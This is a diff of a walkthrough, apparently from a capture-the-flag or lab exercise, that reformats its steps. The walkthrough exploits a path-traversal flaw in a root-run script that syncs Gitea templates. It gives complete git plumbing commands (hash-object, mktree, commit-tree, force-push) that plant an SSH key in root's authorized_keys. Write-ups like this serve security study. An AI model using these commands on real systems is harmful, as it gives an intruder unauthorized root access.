@@ -58,7 +58,11 @@ As shown:
 At this point i thought that this was a clear escalation path from the *git* user (who has write access to the script) to *root* (who execute the script).
 But reading the script it turns out is vulnerable. Leveraging the vulnerability we could avoid a lateral movement to the *git* user.
 Essentially it is synchronizing gitea template repositories to the local filesystem.
-It reads the filepath with a command like *git ls-tree -r HEAD* in the block around lines 60-65 and then it write to a file based on this path without validating it:
+It reads the filepath with a command like:
+
+*git ls-tree -r HEAD* 
+
+in the block around lines 60-65 and then it write to a file based on this path without validating it:
 
 *target = os.path.join(stage_path, filepath)* on line 88
 
@@ -87,24 +91,31 @@ We need to build the tree manually, because *git add* refuses to stage a path co
 So i generated an ssh keypair, then ran the following commands to assign the public key to the file *../../../../../../../../root/.ssh/authorized_keys*:
 
 Build a Blob object from the ssh public key:
+
 **blob=$(git hash-object -w id_rsa.pub)**
 
 Create a tree containing the blob under the filename authorized_keys (100644 = mode for a non-executable file):
+
 **t=$(printf '100644 blob %s\tauthorized_keys\n' "$blob" | git mktree)**
 
 This command wraps the previous tree inside a new tree, as a subdirectory named .ssh (040000 = mode for a directory):
+
 **t=$(printf '040000 tree %s\t.ssh\n' "$t" | git mktree)**
 
 Now $t = a directory containing .ssh/authorized_keys.
 This command wraps the previous tree inside a new tree, as a subdirectory named root:
+
 **t=$(printf '040000 tree %s\troot\n' "$t" | git mktree)**
 
 Now $t = root/.ssh/authorized_keys.
 This command wraps the previous tree 8 more times, each in a directory named *..*, producing the *../../../../../../../../* prefix:
+
 **for i in $(seq 1 8); do t=$(printf '040000 tree %s\t..\n' "$t" | git mktree); done**
 
 Then we commit and push:
+
 **commit=$(git commit-tree "$t" -m "update template")**
+
 **git push -f origin "${commit}:refs/heads/main"**
 
 This should push to the remote repository the tree we built which contains the public ssh key with name *../../../../../../../../root/.ssh/authorized_keys*.
